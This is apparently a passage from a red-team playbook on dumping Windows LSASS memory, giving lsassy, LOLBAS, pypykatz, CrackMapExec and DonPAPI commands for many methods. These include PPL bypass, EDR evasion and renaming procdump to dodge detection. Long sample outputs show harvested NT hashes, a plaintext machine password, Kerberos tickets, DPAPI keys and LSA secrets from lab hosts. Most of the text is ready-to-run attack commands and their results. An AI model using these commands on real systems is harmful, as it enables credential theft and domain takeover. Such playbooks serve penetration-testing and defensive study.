							[+] 10.0.0.60 30 Kerberos tickets written to /root/.config/lsassy/tickets
							SUCCESS:root:8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
							[+] 10.0.0.60 8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
				* procdump_embedded

						lsassy -m procdump_embedded -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>

								lsassy -m procdump_embedded --options procdump_path=binaries/procdump64.exe -u 'domain_admin' -p 'P@ssw0rd' -d 'microsoftdelivery.com' -o outfile4.txt 10.0.0.60
								SUCCESS:root:Authentication successful
								[+] 10.0.0.60 Authentication successful
								SUCCESS:root:procdump uploaded
								[+] 10.0.0.60 procdump uploaded
								SUCCESS:root:Lsass dumped in C:\Windows\Temp\zCXVJ.dmp (56354118 Bytes)
								[+] 10.0.0.60 Lsass dumped in C:\Windows\Temp\zCXVJ.dmp (56354118 Bytes)
								SUCCESS:root:Lsass dump deleted
								[+] 10.0.0.60 Lsass dump deleted
								SUCCESS:root:MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
								[+] 10.0.0.60 MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
								SUCCESS:root:MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
								[+] 10.0.0.60 MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
								SUCCESS:root:microsoftdelivery.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
								[+] 10.0.0.60 microsoftdelivery.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
								SUCCESS:root:MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
								[+] 10.0.0.60 MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
								SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_53b91a0b.kirbi)
								[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_53b91a0b.kirbi)
								SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_375a9e7f.kirbi)
								[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_375a9e7f.kirbi)
								SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:13 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_6e2f1491.kirbi)
								[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:13 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_6e2f1491.kirbi)
								SUCCESS:root:MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_a88b0199.kirbi)
								[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_a88b0199.kirbi)
								SUCCESS:root:MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_8b453c42.kirbi)
								[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_8b453c42.kirbi)
								SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_4e7fda28.kirbi)
								[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_4e7fda28.kirbi)
								SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_824abab7.kirbi)
								[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_824abab7.kirbi)
								SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_8bbd4baa.kirbi)
								[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_8bbd4baa.kirbi)
								SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_035c7523.kirbi)
								[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_035c7523.kirbi)
								SUCCESS:root:Credentials saved to outfile4.txt
								[+] 10.0.0.60 Credentials saved to outfile4.txt
								SUCCESS:root:30 Kerberos tickets written to /root/.config/lsassy/tickets
								[+] 10.0.0.60 30 Kerberos tickets written to /root/.config/lsassy/tickets
								SUCCESS:root:8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
								[+] 10.0.0.60 8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
	* sqldumper
		* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
			* References
					* Legitimate Windows Binary
			* Methods
				* sqldumper -<br />[https://twitter.com/countuponsec/status/910969424215232518](https://twitter.com/countuponsec/status/910969424215232518)
	* rdrleakdiag
		* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
			* References
				* [https://twitter.com/0gtweet/status/1299071304805560321](https://twitter.com/0gtweet/status/1299071304805560321)
			* Methods

						lsassy -m rdrleakdiag -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>

							(lsassy) root@Jack-PC:~/lsassy# lsassy -m rdrleakdiag -u 'domain_admin' -p 'P@ssw0rd' -d 'microsoftdelivery.com' -K Kerberos -f pretty -o outfile3.txt 10.0.0.60
							SUCCESS:root:Authentication successful
							[+] 10.0.0.60 Authentication successful
							SUCCESS:root:Lsass dumped in C:\Windows\Temp\l6DRXZdfx.xml (54951534 Bytes)
							[+] 10.0.0.60 Lsass dumped in C:\Windows\Temp\l6DRXZdfx.xml (54951534 Bytes)
							SUCCESS:root:Lsass dump deleted
							[+] 10.0.0.60 Lsass dump deleted
							SUCCESS:root:MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							[+] 10.0.0.60 MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							SUCCESS:root:MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
							[+] 10.0.0.60 MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
							SUCCESS:root:microsoftdelivery.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
							[+] 10.0.0.60 microsoftdelivery.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
							SUCCESS:root:MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							[+] 10.0.0.60 MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_53b91a0b.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_53b91a0b.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_375a9e7f.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:14 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_375a9e7f.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:13 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_6e2f1491.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_admin  [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:13 (TGT_MICROSOFTDELIVERY.COM_domain_admin_krbtgt_MICROSOFTDELIVERY.COM_6e2f1491.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_a88b0199.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_a88b0199.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_8b453c42.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\domain_user   [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:07 (TGT_MICROSOFTDELIVERY.COM_domain_user_krbtgt_MICROSOFTDELIVERY.COM_8b453c42.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_4e7fda28.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_4e7fda28.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_824abab7.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:02 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_824abab7.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_8bbd4baa.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_8bbd4baa.kirbi)
							SUCCESS:root:MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_035c7523.kirbi)
							[+] 10.0.0.60 MICROSOFTDELIVERY.COM\WIN11$        [TGT] Domain: MICROSOFTDELIVERY.COM - End time: 2022-08-04 01:01 (TGT_MICROSOFTDELIVERY.COM_WIN11$_krbtgt_MICROSOFTDELIVERY.COM_035c7523.kirbi)
							SUCCESS:root:Credentials saved to outfile3.txt
							[+] 10.0.0.60 Credentials saved to outfile3.txt
							SUCCESS:root:30 Kerberos tickets written to /root/lsassy/Kerberos
							[+] 10.0.0.60 30 Kerberos tickets written to /root/lsassy/Kerberos
							SUCCESS:root:8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
							[+] 10.0.0.60 8 masterkeys saved to /root/.config/lsassy/masterkeys.txt
	* <details><summary>Additional LOLBAS, Needs Research (Click to expand)</summary><p>
		* References
			* [https://lolbas-project.github.io/#t1003]](https://lolbas-project.github.io/#t1003)
		* <details><summary>Tttracer.exe (Click to expand)</summary><p>
			* References
				* [https://twitter.com/oulusoyum/status/1191329746069655553](https://twitter.com/oulusoyum/status/1191329746069655553)
				* [https://twitter.com/mattifestation/status/1196390321783025666](https://twitter.com/mattifestation/status/1196390321783025666)
				* [https://lists.samba.org/archive/cifs-protocol/2016-April/002877.html](https://lists.samba.org/archive/cifs-protocol/2016-April/002877.html)
			* Notes
				* Requires administrator privileges
				* Dump lsass
			* Examples

					TTTracer.exe -dumpFull -attach pid
		* <details><summary>adplus.exe (Click to expand)</summary><p>
			* References
				* [https://blog.thecybersecuritytutor.com/adplus-debugging-tool-lsass-dump/](https://blog.thecybersecuritytutor.com/adplus-debugging-tool-lsass-dump/)
			* Examples

					adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet
		* <details><summary>Dump64.exe (Click to expand)</summary><p>
			* References
				* [https://twitter.com/mrd0x/status/1460597833917251595](https://twitter.com/mrd0x/status/1460597833917251595)
			* Notes
				* Additional Evasion:
					1. Rename procdump.exe to dump64.exe
					1. Place the new "dump64.exe" in the folder `C:\Program Files (x86)\Microsoft Visual Studio\*`
					1. Dump lsass
			* Examples

					dump64.exe <pid> out.dmp
* rawrpc
	* <details><summary>References (Click to expand)</summary><p>
		* -<br />[https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e](https://gist.github.com/xpn/c7f6d15bf15750eae3ec349e7ec2380e)
	* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
		* References
			* [https://github.com/Hackndo/lsassy/pull/74](https://github.com/Hackndo/lsassy/pull/74)
		* Command

				lsassy --options rpcloader_path=binaries/rpcloader.c
* syscalls
	* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
		* References
		* Methods
			* dumpert
				* This method uploads dumpert.exe or dumpert.dll from outflanknl to dump lsass process using syscalls.


						lsassy -m dumpert -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>

							
			* dumpertdll

						lsassy -m dumpertdll -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>

							
* Bypass PPL
	* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
		* References
		* Methods
			* ppldump
				* This method uploads ppldump.exe from itm4n to dump lsass process and bypass PPL.


						lsassy -m ppldump -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>

							.
			* ppldump_embedded

						lsassy -m ppldump_embedded -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>

							.
* Use existing handle to lass from LSA plugin (MirrorDump)
	* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
		* References
		* Methods
			* mirrordump
				* This method uploads Mirrordump.exe from Ccob to dump lsass using already opened handle to lsass via an LSA plugin.

						lsassy -m mirrordump -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>
		* References
		* Methods
			* mirrordump_embedded


						lsassy -m mirrordump_embedded -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>							
* WER method from PowerSploit
	* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
		* wer (Not working when tested)

				lsassy -m wer -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
			* <details><summary>Example Output (Click to expand)</summary><p>
* EDRSandBlast Technique -<br />[https://github.com/wavestone-cdt/EDRSandblast](https://github.com/wavestone-cdt/EDRSandblast)
	* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
		* Examples

				lsassy -m edrsandblast --options edrsandblast_path=<locationofbinary> -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
			* <details><summary>Example Output (Click to expand)</summary><p>
* Nanodump Method -<br />[https://github.com/helpsystems/nanodump](https://github.com/helpsystems/nanodump)
	* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
			* Examples
				* Example 1
				
						lsassy -d domain.local -u <username> -p <password> <target>
				* Sample Output

						[+] [192.168.0.76] TEST\testadmin
						58a478135a93ac3bf058a5ea0e8fdb71[+] [192.168.0.76] TEST\testadmin  Password123
* DLL Injection
	* <details><summary>lsassy (Click to expand) -<br />[https://github.com/Hackndo/lsassy](https://github.com/Hackndo/lsassy)</summary><p>
		* References
			* [https://twitter.com/HackAndDo/status/1447970760593711105](https://twitter.com/HackAndDo/status/1447970760593711105)
		* Methods
			* dllinject

						lsassy -m dllinject -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
					* <details><summary>Example Output (Click to expand)</summary><p>
							
* <details><summary>pypkatz (Click to expand) -<br />[https://github.com/skelsec/pypykatz](https://github.com/skelsec/pypykatz)</summary><p>
	* <details><summary>Install (Click to expand)</summary><p>
		* Pip

				pip3 install pypykatz
		* GitHub
			* Pre-Reqs

					pip3 install minidump minikerberos aiowinreg msldap winacl
			* Install after clone

					python3 setup.py install
	* Command

			pypykatz smb lsassdump 'smb2+ntlm-password://TEST\Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.102'
		* Example Output

				.
* <details><summary>crackmapexec modules ([CrackMapExec Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/CrackMapExec.md)) (Click to expand)</summary><p>
	* lsassy module
		* References
			* [https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/modules/lsassy_dump.py](https://github.com/Porchetta-Industries/CrackMapExec/blob/master/cme/modules/lsassy_dump.py)
		* Examples

				cme smb <target> -u <local_admin> -p <Password> -M lsassy

	* nanodump module
		* Examples

				cme smb <target> -u <local_admin> -p <Password> -M nanodump
* <details><summary>DonPAPI (Click to expand)</summary><p>
	* [https://github.com/login-securite/DonPAPI](https://github.com/login-securite/DonPAPI)
		* Requirements
			* Leverages impacket and requires impacket formatting ([Impacket Tool Guide](Testaments_and_Books/Redvelations/Tools/Active_Directory_and_Windows/impacket.md))
		* Command

				python DonPAPI.py 'securelab/domain_admin:P@ssw0rd@10.0.0.1'
			* Parameters
				* `--GetHashes` - Get all users Masterkey's hash & DCC2 hash 
				* impacket authentication parameters
		* <details><summary>Sample Output (Click to expand)</summary><p>

				(DonPAPI-pjnvgme9) root@ubuntu:~/Tools/DonPAPI# python DonPAPI.py 'securelab/domain_admin:P@ssw0rd@10.0.0.1'
				Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

				INFO Initializing database ./seatbelt.db
				INFO Loaded 1 targets
				INFO [10.0.0.1] [+] DC01 (domain:securelab.local) (Windows 10.0 Build 17763) [SMB Signing Disabled]
				INFO host:     \\10.0.0.22, user: ANONYMOUS LOGON, active:     0, idle:     0
				INFO host:     \\10.0.0.22, user: domain_admin, active:     0, idle:     0
				INFO [10.0.0.1] [+] Found user Administrator
				INFO [10.0.0.1] [+] Found user All Users
				INFO [10.0.0.1] [+] Found user Default
				INFO [10.0.0.1] [+] Found user Default User
				INFO [10.0.0.1] [+] Found user domain_admin
				INFO [10.0.0.1] [+] Found user Public
				INFO [10.0.0.1]  [+] Dumping LSA Secrets
				INFO [10.0.0.1] [-] Found DPAPI Machine key : 0x9663dc9ffa84c0767e47fd41ce70197447bbcb55
				INFO [10.0.0.1] [-] Found DPAPI User key : 0x000dadb580d0b409d6ba8c6bb0c3060be1daabdf
				INFO [10.0.0.1] [-] Found DPAPI Machine key : 0xea1ed396496460eea2f7e4f15a9e969aba16f1b2
				INFO [10.0.0.1] [-] Found DPAPI User key : 0xb1c6e91f897a6eb0bbbc726bb0f80fb9122fdb94
				INFO [10.0.0.1] [+]  LSA :  NL$KM_history : 697b6a08426b6d1dd9ba975459b5f3fd830e1a4da89c649c7613803c0bf1ba2bbae058e9612609914b05861acfcf4e7e9c38910ca84c90df6cfe40e7c9e60281 
				INFO [10.0.0.1]  [+] Dumping SAM Secrets
				ERROR SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
				INFO [10.0.0.1] [+]  SAM : Collected 4 hashes 
				INFO [10.0.0.1] [+] Gathering DPAPI Secret blobs on the target
				INFO [10.0.0.1] [+]  
				[CREDENTIAL]
				LastWritten : 2021-11-01 23:13:32
				Flags       : 48 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
				Persist     : 0x2 (CRED_PERSIST_LOCAL_MACHINE)
				Type        : 0x1 (CRED_PERSIST_SESSION)
				Target      : WindowsLive:target=virtualapp/didlogical
				Description : PersistedCredential
				Unknown     : 
				Username    : 02gvvutlgccdigma
				Unknown3     : 
				 
				INFO [10.0.0.1] [+] Gathering Wifi Keys
				INFO [10.0.0.1] [+] Gathering Vaults
				INFO [10.0.0.1] [+] Gathering Chrome Secrets 
				INFO [10.0.0.1] [+] Gathering Mozilla Secrets 
				INFO [10.0.0.1] [+] Gathering VNC Passwords
				INFO [10.0.0.1] [+] Gathering mRemoteNG Secrets 
				INFO [10.0.0.1] [+] Gathering Recent Files and Desktop Files 
				INFO [+] Generating report
* Dump Kerberos Tickets
	* <details><summary>LSASSY Kerberos CME (Click to expand)</summary><p>
		* <details><summary>References (Click to expand)</summary><p>
			* [https://twitter.com/mpgn_x64/status/1453841000582066189](https://twitter.com/mpgn_x64/status/1453841000582066189)
		* Commands

				lsassy -u $LOCAL_ADMIN -p $PASSWORD -d $DOMAIN -K $WORKDIR/Kerberos-Outfolder -f <format, e.g., pretty> -o outfile.txt <target>
			* <details><summary>Example Output (Click to expand)</summary><p>

					lsassy -u 'domain_admin' -p 'P@ssw0rd' -d 'domain.com' -K Kerberos -f pretty -o outfile.txt 10.0.0.60
					SUCCESS:root:Authentication successful
					[+] 10.0.0.60 Authentication successful
					SUCCESS:root:Lsass dumped in C:\Windows\Temp\OwGcbY.fnt (55581140 Bytes)
					[+] 10.0.0.60 Lsass dumped in C:\Windows\Temp\OwGcbY.fnt (55581140 Bytes)
					SUCCESS:root:Lsass dump deleted
					[+] 10.0.0.60 Lsass dump deleted
					SUCCESS:root:MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
					[+] 10.0.0.60 MICROSOFTDELIVE\domain_admin        [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
					SUCCESS:root:MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
					[+] 10.0.0.60 MICROSOFTDELIVE\WIN11$              [NT] a0a3b45f929e097b3454477231a43e28 | [SHA1] 56b9281e7e24256f026ddee862d2d841695413e7
					SUCCESS:root:domain.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
					[+] 10.0.0.60 domain.com\WIN11$        [PWD] [0Ix-4M0R*6QSOG;A`@bYjFVeH7&'vQn*ZRpHMeJd=S1+'/5qL)H;vH)DXSzp_8[?_q']zxDX5m;\+[Q^<h5`W^kg#<zQT^gYa_dHPP\OaW$ThgSG`=UT*>K
					SUCCESS:root:MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
					[+] 10.0.0.60 MICROSOFTDELIVE\domain_user         [NT] e19ccf75ee54e06b06a5907af13cef42 | [SHA1] 9131834cf4378828626b1beccaa5dea2c46f9b63
